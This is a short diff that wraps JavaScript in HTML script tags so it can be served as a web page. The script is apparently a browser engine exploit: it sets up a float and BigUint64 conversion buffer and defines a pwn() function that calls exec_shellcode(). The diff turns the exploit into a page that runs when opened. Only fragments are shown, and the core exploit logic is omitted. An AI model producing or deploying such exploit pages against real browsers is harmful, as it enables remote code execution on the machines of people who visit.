@@ -1,3 +1,5 @@
+<html>
+	<script>
 let conversion_buffer = new ArrayBuffer(8);
 let float_view = new Float64Array(conversion_buffer);
 let int_view = new BigUint64Array(conversion_buffer);
@@ -76,3 +78,5 @@ function pwn() {
     exec_shellcode();
     return;
 }
+		</script>
+</html>
